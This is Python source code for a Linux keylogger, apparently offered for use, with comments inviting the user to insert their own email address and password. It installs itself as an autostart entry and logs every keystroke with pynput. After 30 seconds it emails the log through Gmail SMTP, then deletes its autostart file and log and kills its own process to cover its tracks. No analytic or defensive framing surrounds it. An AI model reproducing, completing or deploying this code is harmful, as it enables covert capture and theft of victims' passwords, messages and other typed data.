import smtplib
from pynput.keyboard import Listener
import logging
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
from threading import Thread, Timer
import os
import shutil
from time import sleep



user = os.path.expanduser('~')
yol = user + "/.config/autostart"
def starUp():
    metin = "[Desktop Entry]\nType=Application\nExec=python3 calistir/keylogger.py\nHidden=false\nX-MATE-Autostart-enabled=true\nName[en_US]=keylog,Name=keylog\nComment[en_US]=\nComment=X-MATE-Autostart-Delay=0]"
    yeni = metin.replace("calistir", user)
    with open("keylog.py.desktop", "w+") as f:
        f.write(yeni)
    a = os.path.abspath('keylog.py.desktop')
    shutil.move(a, yol)


def heyLog():
    os.chdir(yol)
    dosya = open("log.txt", "a+")
    dosya.close()
    log_dir = ""
    logging.basicConfig(filename=(log_dir + "log.txt"), level=logging.DEBUG)

    def on_press(key):
        logging.info(str(key).strip("''"))

    with Listener(on_press=on_press) as listener:
        listener.join()


def sendMail():
    fromaddr = "hello@mail.com" #change your mail address
    toaddr = "hello@mail.com" #change your mail address
    msg = MIMEMultipart()
    filename = "log.txt"
    attachment = open(filename, "rb")
    p = MIMEBase('application', 'octet-stream')
    p.set_payload(attachment.read())
    encoders.encode_base64(p)
    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
    msg.attach(p)
    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()
    s.login(fromaddr, "password") #change your password
    text = msg.as_string()
    s.sendmail(fromaddr, toaddr, text)
    s.quit()


def dosyaSil():
    os.remove(yol + "/keylog.py.desktop")
    os.remove(yol + "/log.txt")
    a = os.getpid()
    sleep(2)
    os.system(f"kill -9 {a}")




if __name__ == "__main__":
    starUp()
    t1 = Thread(target=heyLog)
    t1.start()
    t2 = Timer(30.0, sendMail)# change mail send time
    t2.start()
    t3 = Timer(33.0, dosyaSil)# change file remove time
    t3.start()
